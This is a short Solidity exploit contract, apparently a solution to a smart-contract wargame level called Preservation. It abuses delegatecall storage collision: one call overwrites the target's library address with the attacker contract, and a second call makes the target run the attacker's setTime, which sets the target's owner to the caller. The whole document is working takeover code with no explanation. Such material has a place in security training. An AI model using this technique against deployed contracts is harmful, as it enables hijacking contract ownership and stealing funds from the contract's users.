contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender);
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
